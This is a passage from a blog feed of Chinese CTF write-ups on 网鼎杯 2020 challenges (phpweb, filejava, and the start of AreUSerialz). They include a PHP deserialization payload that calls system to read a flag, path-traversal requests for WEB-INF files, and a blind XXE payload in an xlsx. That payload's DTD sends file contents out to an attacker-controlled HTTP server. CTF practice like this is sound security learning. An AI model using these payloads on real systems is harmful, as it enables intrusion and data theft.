invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先禁用了一大堆函数<br>得到源码以后才知道原来是<code>call_user_func()</code>函数，还是见得少了，大佬估计直接能看出来是这个函数，我还要靠猜。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里那么多函数被禁了，主要还是禁了<code>system</code>比较难受，但是问题不大，毕竟没有禁<code>file_get_contents</code>、<code>cat</code>以及<code>serialize</code>。</p><p>这里<code>serialize</code>才是重点（敲黑板！），毕竟源码里给我们提供了一个<code>Test类</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后简单明了构造payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="comment">// $a-&gt;p = &#x27;ls ../../../&#x27;;          ==&gt;  O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:12:&quot;ls ../../../&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span></span><br><span class="line">    <span class="comment">// $a -&gt; p = &quot;find / -name &#x27;flag*&#x27;&quot;;        ⇒  O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:20:&quot;find / -name &#x27;flag*&#x27;&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span></span><br><span class="line">    <span class="variable">$a</span> -&gt; p = <span class="string">&#x27;cat /tmp/flagoefiu4r93&#x27;</span>;     <span class="comment">//  ==&gt;  O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span></span><br><span class="line">    <span class="variable">$a</span> -&gt; func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;网鼎杯-2020-朱雀组–phpweb&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-朱雀组–phpweb&quot; class=&quot;headerlink&quot; title=&quot;网鼎杯 2020 朱雀组–phpweb&quot;&gt;&lt;/a&gt;网鼎杯 2020 朱雀组–phpweb&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://flypigc.github.io/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--filejava/"/>
    <id>https://flypigc.github.io/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--filejava/</id>
    <published>2025-12-11T06:51:35.627Z</published>
    <updated>2025-12-11T06:52:08.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-青龙组–filejava"><a href="#网鼎杯-2020-青龙组–filejava" class="headerlink" title="网鼎杯 2020 青龙组–filejava"></a>网鼎杯 2020 青龙组–filejava</h1><span id="more"></span><p>先上传随便一个文件，<br>点下载抓包</p><p>看到?file</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435766372-8a1ae2cd-7348-40ec-b05f-c2a1f6c1f94f.png" alt="null"></p><p>看到有一个路径，里面有WEB-INF，题目提示与java有关，那应该是web.xml文件泄露，尝试读取</p><p>Java Web目录结构</p><p>WEB-INF&#x2F;web.xml：核心配置文件，映射Servlet类路径。<br>WEB-INF&#x2F;classes&#x2F;：存放编译后的Java类文件。<br>利用路径穿越（..&#x2F;..&#x2F;）可读取敏感文件。<br>XXE漏洞原理</p><p>XML解析器未禁用外部实体时，可通过file:&#x2F;&#x2F;协议读取本地文件，或通过HTTP请求外带数据（Blind XXE）。<br>Apache POI 3.10版本默认未禁用外部实体，导致漏洞。<br>Excel文件结构</p><p>XLSX为ZIP压缩包，内含XML文件，修改[Content_Types].xml可注入恶意实体。<br>漏洞利用链设计</p><p>文件上传 → 触发XXE → 外带数据 → 获取Flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435766448-a8998f50-7f4b-4d62-bcdc-1f0d34c2cbe0.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</span><br></pre></td></tr></table></figure><p>下载下来一个class文件反编译一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/* loaded from: _.._.._.._.._.._.._.._.._usr_local_tomcat_webapps_ROOT_WEB-INF_classes_cn_abc_servlet_DownloadServlet.class */</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">  </span><br><span class="line">        doPost(request, response);</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(request.getParameter(<span class="string">&quot;filename&quot;</span>).getBytes(<span class="string">&quot;ISO8859-1&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">  </span><br><span class="line">        System.out.println(<span class="string">&quot;filename=&quot;</span> + fileName);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (fileName != <span class="literal">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">  </span><br><span class="line">            request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;禁止读取&quot;</span>);</span><br><span class="line">  </span><br><span class="line">            request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward(request, response);</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">fileSaveRootPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> findFileSavePathByFileName(fileName, fileSaveRootPath);</span><br><span class="line">  </span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">  </span><br><span class="line">            request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;您要下载的资源已被删除!&quot;</span>);</span><br><span class="line">  </span><br><span class="line">            request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward(request, response);</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">realname</span> <span class="operator">=</span> fileName.substring(fileName.indexOf(<span class="string">&quot;_&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">  </span><br><span class="line">        response.setHeader(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">  </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">  </span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> in.read(buffer);</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  </span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  </span><br><span class="line">                in.close();</span><br><span class="line">  </span><br><span class="line">                out.close();</span><br><span class="line">  </span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">            &#125;</span><br><span class="line">  </span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> &#123;</span><br><span class="line">  </span><br><span class="line">        <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> filename.hashCode();</span><br><span class="line">  </span><br><span class="line">        <span class="type">int</span> <span class="variable">dir1</span> <span class="operator">=</span> hashCode &amp; <span class="number">15</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="type">int</span> <span class="variable">dir2</span> <span class="operator">=</span> (hashCode &amp; <span class="number">240</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> saveRootPath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">  </span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">  </span><br><span class="line">            file.mkdirs();</span><br><span class="line">  </span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r ./payload.xlsx ./excel-123456</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435766516-236dcb7a-2cf4-4105-b39f-bd22191980ff.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 4560</span><br><span class="line">netstat -tulnp | grep 4560</span><br><span class="line"></span><br><span class="line">kill pid</span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://10.88.15.58:4560/%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>是服务器nc的端口<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435766574-eeb1a5ec-7e9c-4cf0-966c-6fab3a4c2e91.png" alt="null"></p><p>启动http服务<br>在xlsx文件的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://10.88.15.58:4560/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435766648-39d29bda-530d-45fc-8ae2-a30fe6b8e939.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 4560</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python -m http.server 4560</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435766706-9a62e862-86bb-4500-891d-8321e8bd9ff5.png" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765435766776-ac0e02d9-59cf-4717-8c40-12a27e9bef65.png" alt="null"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;网鼎杯-2020-青龙组–filejava&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-青龙组–filejava&quot; class=&quot;headerlink&quot; title=&quot;网鼎杯 2020 青龙组–filejava&quot;&gt;&lt;/a&gt;网鼎杯 2020 青龙组–filejava&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://flypigc.github.io/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--AreUSerialz/"/>
    <id>https://flypigc.github.io/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--AreUSerialz/</id>
    <published>2025-12-11T06:51:35.627Z</published>
    <updated>2025-12-11T06:52:48.729Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-青龙组–AreUSerialz"><a href="#网鼎杯-2020-青龙组–AreUSerialz" class="headerlink" title="网鼎杯 2020 青龙组–AreUSerialz"></a>网鼎杯 2020 青龙组–AreUSerialz</h1><span id="more"></span><p>题目给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;  </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);  </span><br><span class="line">                <span class="keyword">die</span>();  </span><br><span class="line">            &#125;            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);  </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);  </span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)            <span class="variable language_">$this</span>-&gt;op = <span 